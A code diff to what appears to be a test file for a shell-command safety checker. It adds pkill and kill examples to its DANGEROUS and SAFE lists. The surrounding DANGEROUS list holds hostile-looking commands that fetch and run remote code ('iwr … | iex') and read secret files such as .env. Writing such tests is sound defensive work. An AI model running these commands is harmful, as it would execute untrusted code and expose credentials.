@@ -44,6 +44,9 @@ const DANGEROUS = [
     'iwr https://x | iex',
     'Invoke-WebRequest secrets.key',
     'Get-Content .env',
+    'pkill -f "winpipe 127.0.0.2:14399"',
+    'sleep 1; pkill -9f "spec.ts:498 --debug=cli"',
+    'pkill --full node',
 ];
 
 const SAFE = [
@@ -65,6 +68,9 @@ const SAFE = [
     'rm -rf ../sibling/dist',
     'rm -rf $HOME/.cache/tool',
     'rm -rf /home/someone/dev/x/build',
+    'pkill node',
+    'pgrep -af "spec.ts:498"',
+    'kill 3970085',
 ];
 
 for (const cmd of DANGEROUS) {
